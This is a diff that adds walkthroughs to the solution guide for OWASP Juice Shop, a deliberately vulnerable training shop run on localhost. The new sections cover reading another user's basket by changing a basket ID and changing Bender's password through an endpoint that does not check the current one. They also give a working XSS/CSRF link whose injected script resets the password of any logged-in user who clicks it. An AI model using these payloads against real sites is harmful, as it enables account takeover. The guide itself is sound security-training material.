@@ -143,6 +143,20 @@ error situation and solve this challenge along the way:
    which is as easy to guess as it is to brute force or retrieve from a
    rainbow table.
 
+### Access someone else's basket
+
+1. Log in as any user.
+2. Put some products into your shopping basket.
+3. Inspect the _Session Storage_ in your browser's developer tools to
+   find a numeric `bid` value.
+4. Change the `bid`, e.g. by adding or subtracting 1 from its value.
+5. Visit <http://localhost:3000/#/basket> to solve the challenge.
+
+> If the challenge is not immediately solved, you might have to
+> `F5`-reload to relay the `bid` change to the Angular client.
+
+![Basket ID in Session Storage](img/session_storage.png)
+
 ### Access a salesman's forgotten backup file
 
 1. Browse to <http://localhost:3000/ftp> (like in
@@ -157,6 +171,108 @@ error situation and solve this challenge along the way:
 Alternatively this challenge can also be solved via _Poison Null Byte_
 injection as in
 [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file).
+
+### Change Bender's password into _slurmCl4ssic_
+
+> The solution below assumes that you **do not know Bender's current
+> password**, because in that case you could just change it via the
+> _Password Change_ form.
+
+1. Log in as anyone.
+2. Inspecting the backend HTTP calls of the _Password Change_ form
+   reveals that these happen via `HTTP GET` and submits current and new
+   password in clear text.
+3. Probe the responses of `/rest/user/change-password` on various
+   inputs:
+    * <http://localhost:3000/rest/user/change-password?current=A> yields
+      a `401` error saying `Password cannot be empty.`
+    * <http://localhost:3000/rest/user/change-password?current=A&new=B>
+      yields a `401` error saying `New and repeated password do not
+      match.`
+    * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=C>
+      also says `New and repeated password do not match.`
+    * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B>
+      says `Current password is not correct.`
+    * <http://localhost:3000/rest/user/change-password?new=B&repeat=B>
+      yields a `200` success returning the updated user as JSON!
+4. Now
+   [Log in with Bender's user account](#log-in-with-benders-user-account)
+   using SQL Injection.
+5. Submit
+   <http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic>
+   to solve the challenge.
+
+If you want to craft an actual CSRF attack against
+`/rest/user/change-password` you will have to invest a bit extra work,
+because a simple attack like _Search_ for `<img
+src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">`
+will not work. Making someone click on the corresponding attack link
+<http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E>
+will return a `500` error when loading the image URL:
+
+```html
+  <!-- ... -->
+  <body>
+    <div id="wrapper">
+      <h1>Juice Shop (Express ~4.14)</h1>
+      <h2><em>500</em> Error: Blocked illegal activity by ::1</h2>
+      <ul id="stacktrace">
+        <li> &nbsp; &nbsp;at C:\Data\Github\juice-shop\routes\changePassword.js:40:14</li>
+        <li> &nbsp; &nbsp;at Layer.handle [as handle_request] (C:\Data\Github\juice-shop\node_modules\express\lib\router\layer.js:95:5)</li>
+        <li> &nbsp; &nbsp;at next (C:\Data\Github\juice-shop\node_modules\express\lib\router\route.js:131:13)</li>
+        <li> &nbsp; &nbsp;at Route.dispatch (C:\Data\Github\juice-shop\node_modules\express\lib\router\route.js:112:3)</li>
+        <li> &nbsp; &nbsp;at Layer.handle [as handle_request] (C:\Data\Github\juice-shop\node_modules\express\lib\router\layer.js:95:5)</li>
+        <li> &nbsp; &nbsp;at C:\Data\Github\juice-shop\node_modules\express\lib\router\index.js:277:22</li>
+        <li> &nbsp; &nbsp;at Function.process_params (C:\Data\Github\juice-shop\node_modules\express\lib\router\index.js:330:12)</li>
+        <li> &nbsp; &nbsp;at next (C:\Data\Github\juice-shop\node_modules\express\lib\router\index.js:271:10)</li>
+        <li> &nbsp; &nbsp;at C:\Data\Github\juice-shop\node_modules\sequelize-restful\lib\index.js:22:7</li>
+        <li> &nbsp; &nbsp;at Layer.handle [as handle_request] (C:\Data\Github\juice-shop\node_modules\express\lib\router\layer.js:95:5)</li>
+      </ul>
+    </div>
+  </body>
+```
+
+To make this exploit work, some more sophisticated attack URL is
+required, for example the following one which was originally described
+in the blog post
+[Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html)
+by Joe Butler:
+
+<http://localhost:3000/#/search?q=%3Cscript%3Exmlhttp%20%3D%20new%20XMLHttpRequest;%20xmlhttp.open('GET',%20'http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic');%20xmlhttp.send()%3C%2Fscript%3E>
+
+Prettyprinted this attack is easier to understand:
+
+```html
+<script>
+xmlhttp = new XMLHttpRequest;
+xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic');
+xmlhttp.send()
+</script>
+```
+
+Anyone who is logged in to the Juice Shop while clicking on this link
+will get their password set to the same one we forced onto Bender!
+
+### Inform the shop about an algorithm or library it should definitely not use the way it does
+
+Juice Shop uses some inappropriate crypto algorithms and libraries in
+different places. While working on the following topics you will learn
+those inappropriate coices in order to exploit and solve them:
+
+* [Forge a coupon code that gives you a discount of at least 80%](#forge-a-coupon-code-that-gives-you-a-discount-of-at-least-80)
+  exploits `z85` (Zero-MQ Base85 implementation) as the library for
+  coupon codes.
+* [Solve challenge #99](#solve-challenge-99) requires you to create a
+  valid hash with the `hashid` library.
+* Passwords in the `Users` table are hashed with unsalted MD5
+* Users registering via Google account will get a very cheap default
+  password that insolves Base64 encoding.
+
+<!-- -->
+
+1. Visit <http://localhost:3000/#/contact>
+2. Submit your feedback with one of the following words in the comment:
+   `z85`, `base85`, `base64`, `md5` or `hashid`.
 
 ### Log in with Jim's user account
 
@@ -363,6 +479,8 @@ explains the problem and gives an exploit example:
 > dialects. Today it is spoken by humans all over the world, in many
 > contexts.[^4]
 
+### Forge a coupon code that gives you a discount of at least 80%
+
 ### Solve challenge #99
 
 1. Open the _Score Board_ and click the _Save Progress_ button
@@ -464,10 +582,13 @@ $("#output").text(id);
 [^1]: http://hakipedia.com/index.php/Poison_Null_Byte
 
 
+
 [^2]: https://en.wikipedia.org/wiki/Easter_egg_(media)
 
 
+
 [^3]: https://en.wikipedia.org/wiki/ROT13
+
 
 
 [^4]: http://www.kli.org/about-klingon/klingon-history
